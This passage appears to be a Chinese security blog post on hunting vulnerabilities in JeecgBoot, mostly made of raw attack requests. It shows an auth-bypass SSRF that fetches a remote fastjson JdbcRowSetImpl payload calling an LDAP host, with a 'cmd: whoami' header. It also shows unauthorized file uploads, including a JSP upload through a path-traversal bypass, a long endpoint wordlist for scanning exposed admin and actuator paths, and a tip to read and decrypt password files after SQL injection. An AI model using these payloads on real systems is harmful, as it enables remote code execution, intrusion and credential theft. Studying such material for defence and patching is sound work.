+<p>POST &#x2F;api&#x2F;..&#x2F;jeecgFormDemoController.do?interfaceTest&#x3D; HTTP&#x2F;1.1<br>Host:<br>Pragma: no-cache<br>Cache-Control: no-cache<br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;120.0.0.0 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,<em>&#x2F;</em>;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7<br>Accept-Encoding: gzip, deflate, br<br>cmd: whoami<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 77</p>
+<p>serverUrl&#x3D;<a target="_blank" rel="noopener" href="http://xxxxxxxx:8877/jeecg.txt&requestBody=1&requestMethod=GET">http://xxxxxxxx:8877/jeecg.txt&amp;requestBody=1&amp;requestMethod=GET</a></p>
+<p>创建如下远程文件，其内容为fastjson代码执行的payload</p>
+<p>{<br>“a”:{<br>“@type”:”java.lang.Class”,<br>“val”:”com.sun.rowset.JdbcRowSetImpl”<br>},<br>“b”:{<br>“@type”:”com.sun.rowset.JdbcRowSetImpl”,<br>“dataSourceName”:”ldap:&#x2F;&#x2F;10.66.64.89:1389&#x2F;8orsiq”,<br>“autoCommit”:true<br>}<br>}</p>
+</blockquote>
+<h2 id="jeecg-boot-jmreport-upload接口存在未授权任意文件上传"><a href="#jeecg-boot-jmreport-upload接口存在未授权任意文件上传" class="headerlink" title="jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传"></a>jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传</h2><blockquote>
+<p>测试发现&#x2F;jeecg-boot&#x2F;jmreport&#x2F;upload接口存在未授权任意文件上传，经实测发现上传接口未授权，但访问上传后的文件需要登录，即带token。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;jmreport&#x2F;upload HTTP&#x2F;1.1<br>User-Agent: Mozilla&#x2F;5.0 (compatible; Baiduspider&#x2F;2.0; <a target="_blank" rel="noopener" href="http://www.baidu.com/search/spider.html">http://www.baidu.com/search/spider.html</a>)<br>Accept: <em>&#x2F;</em><br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Cache-Control: no-cache<br>Pragma: no-cache<br>Host:<br>Content-Length: 1476</p>
+<p>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”11111.txt”<br>Content-Type: text&#x2F;html</p>
+<p>&lt;%! 1111&gt;<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”fileName”</p>
+<p>11111.txt<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4<br>Content-Disposition: form-data; name&#x3D;”biz”</p>
+<p>excel_online<br>——WebKitFormBoundaryyfyhSCMs9cajzFD4–</p>
+</blockquote>
+<h2 id="Jeecg-commonController-do文件上传"><a href="#Jeecg-commonController-do文件上传" class="headerlink" title="Jeecg-commonController.do文件上传"></a>Jeecg-commonController.do文件上传</h2><blockquote>
+<p>由于 &#x2F;api 接口鉴权时未过滤路径遍历，攻击者可构造包含 ..&#x2F; 的url绕过鉴权。攻击者可构造恶意请求利用 commonController 接口进行文件上传攻击实现远程代码执行。</p>
+<p>POST &#x2F;jeecg-boot&#x2F;api&#x2F;..&#x2F;commonController.do?parserXml HTTP&#x2F;1.1<br>Host:<br>Accept-Encoding: gzip, deflate<br>Content-Length: 360<br>User-Agent: Mozilla&#x2F;2.0 (compatible; MSIE 3.01; Windows 95<br>Content-Type: multipart&#x2F;form-data; boundary&#x3D;—-WebKitFormBoundarygcflwtei<br>Connection: close</p>
+<p>——WebKitFormBoundarygcflwtei<br>Content-Disposition: form-data; “name&#x3D;”name”</p>
+<p>zW9YCa.png<br>——WebKitFormBoundarygcflwtei<br>ontent-Disposition: form-data; name&#x3D;”documentTitle”</p>
+<p>blank<br>——WebKitFormBoundarygcflwtei<br>Content-Disposition: form-data; name&#x3D;”file”; filename&#x3D;”zW9YCa.jsp”<br>Content-Type: image&#x2F;png</p>
+<p>11111<br>——WebKitFormBoundarygcflwtei–</p>
+</blockquote>
+<h2 id="jeecg-boot字典扫描"><a href="#jeecg-boot字典扫描" class="headerlink" title="jeecg-boot字典扫描"></a>jeecg-boot字典扫描</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/v2/api-docs<br><span class="hljs-regexp">/jeecg-boot/online</span><span class="hljs-regexp">/cgform/head</span><span class="hljs-regexp">/fileTree?_t=1632524014&amp;parentPath=/</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/user/query</span>SysUser?username=admin<br><span class="hljs-regexp">/jeecg/</span><br><span class="hljs-regexp">/api/sys</span><span class="hljs-regexp">/</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user</span><br><span class="hljs-regexp">/v</span>2/api-docs<br><span class="hljs-regexp">/swagger-ui.html</span><br><span class="hljs-regexp">/env</span><br><span class="hljs-regexp">/actuator</span><br><span class="hljs-regexp">/mappings</span><br><span class="hljs-regexp">/metrics</span><br><span class="hljs-regexp">/beans</span><br><span class="hljs-regexp">/configprops</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/metrics</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/mappings</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/beans</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/configprops</span><br><span class="hljs-regexp">/actuator</span><span class="hljs-regexp">/httptrace</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/index.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/sql.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/weburi.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/websession.html</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/weburi.json</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/websession.json</span><br><span class="hljs-regexp">/druid</span><span class="hljs-regexp">/login.html</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/config/list</span><br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user/add</span><br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/edit</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/user/query</span>ById<br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/changePassword</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/role/list</span><br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/role/edit</span><br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/queryPermission</span><br><span class="hljs-regexp">/v</span>2/api-docs<br><span class="hljs-regexp">/v1/api</span>-docs<br><span class="hljs-regexp">/api-docs</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/menu/list</span><br><span class="hljs-regexp">/sys/menu</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/menu/edit</span><br><span class="hljs-regexp">/sys/menu</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/depart/list</span><br><span class="hljs-regexp">/sys/depart</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/depart/edit</span><br><span class="hljs-regexp">/sys/depart</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/list</span><br><span class="hljs-regexp">/online/cgform</span><span class="hljs-regexp">/add</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/edit</span><br><span class="hljs-regexp">/online/cgform</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/fields</span><span class="hljs-regexp">/&#123;tableName&#125;</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/table</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/table</span><span class="hljs-regexp">/sync</span><br><span class="hljs-regexp">/online</span><span class="hljs-regexp">/cgform/generate</span>Code<br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/dict/add</span><br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/edit</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/dict/delete</span><br><span class="hljs-regexp">/act/process</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/process/deploy</span><br><span class="hljs-regexp">/act/task</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/task/complete</span><br><span class="hljs-regexp">/act/task</span><span class="hljs-regexp">/history</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/common/upload</span><br><span class="hljs-regexp">/sys/common</span><span class="hljs-regexp">/download/</span>&#123;fileId&#125;<br><span class="hljs-regexp">/sys/common</span><span class="hljs-regexp">/view/</span>&#123;fileId&#125;<br><span class="hljs-regexp">/monitor/redis</span><span class="hljs-regexp">/info</span><br><span class="hljs-regexp">/monitor</span><span class="hljs-regexp">/server/info</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/list</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/add</span><br><span class="hljs-regexp">/sys/log</span><span class="hljs-regexp">/list</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/log/delete</span><br><span class="hljs-regexp">/sys/sms</span><span class="hljs-regexp">/send</span><br><span class="hljs-regexp">/sys</span><span class="hljs-regexp">/sms/list</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/edit</span><br><span class="hljs-regexp">/api/test</span><span class="hljs-regexp">/demo/delete</span><br><span class="hljs-regexp">/report/load</span>Report/&#123;code&#125;<br><span class="hljs-regexp">/chart/api</span><span class="hljs-regexp">/getChartData</span><br><span class="hljs-regexp">/api</span><span class="hljs-regexp">/test/demo</span><span class="hljs-regexp">/queryById</span><br><span class="hljs-regexp">/act</span><span class="hljs-regexp">/process/delete</span><br><span class="hljs-regexp">/sys/dict</span><span class="hljs-regexp">/loadDictItems/</span>&#123;dictCode&#125;<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/getLoginQrcode</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/getQrcodeToken<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/login</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/phoneLogin<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/scanLoginQrcode</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDataSource/add<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/delete</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/edit</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/list</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDataSource/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/add</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/add</span>Group<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/del</span>DragDataSetHeadGroup<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/delete</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/edit</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetHead/update</span>Group<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/add</span><br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/delete</span><br><span class="hljs-regexp">/jeecg-boot/druid</span><span class="hljs-regexp">/login.html</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDatasetParam/deleteBatch<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/edit</span><br><span class="hljs-regexp">/jeecg-boot/actuator</span><span class="hljs-regexp">/httptrace</span><br><span class="hljs-regexp">/jeecg</span>-boot/drag/onlDragDatasetParam/list<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/onlDragDatasetParam/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/drag</span><span class="hljs-regexp">/websocket/send</span>Data<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/check</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/checkRule/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span>File<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/add</span>Text<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/delete</span>One<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/file</span>List<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/list</span>ByForm<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/comment/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dataSource/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/dictItem/dict</span>ItemCheck<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/duplicate/check</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/files/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/fillRule/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/formFile/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/query</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/position/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/quartzJob/pause</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/quartzJob/resume</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/randomImage/</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartPermission/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysDepartRole/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/add</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/delete</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/edit</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/list</span><br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/query</span>ByCode<br><span class="hljs-regexp">/jeecg-boot/sys</span><span class="hljs-regexp">/sysRoleIndex/query</span>ById<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/dynamic/test</span>1<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/add</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/delete</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/delete</span>Batch<br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/edit</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/list</span><br><span class="hljs-regexp">/jeecg-boot/test</span><span class="hljs-regexp">/jeecgDemo/query</span>ById<br><span class="hljs-regexp">/sys/user</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/jeecg</span>-boot/sys/user/addSysUserRole<br><span class="hljs-regexp">/sys/role</span><span class="hljs-regexp">/delete</span><br><span class="hljs-regexp">/user</span><span class="hljs-regexp">/register</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="Jeecg-Exploit"><a href="#Jeecg-Exploit" class="headerlink" title="Jeecg-Exploit"></a>Jeecg-Exploit</h2><p><img src="/../images/07c514aa-3a2b-40f8-8ae4-6cdbfb37bd5a.png" srcset="/img/loading.gif" lazyload alt="07c514aa-3a2b-40f8-8ae4-6cdbfb37bd5a"></p>
+<p>若sql注入漏洞但是无法getshell，可以另辟蹊径，直接读取密码文件然后进行解密。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>jeecg-boot漏洞挖掘</div>
+      <div>http://maskobito.github.io/2025/06/14/jeecg-boot漏洞挖掘/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>MaskObito</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/08/25/360%E5%AE%9E%E4%B9%A0/" title="360实习总结">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">360实习总结</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/06/08/xss/" title="xss">
+                        <span class="hidden-mobile">xss</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
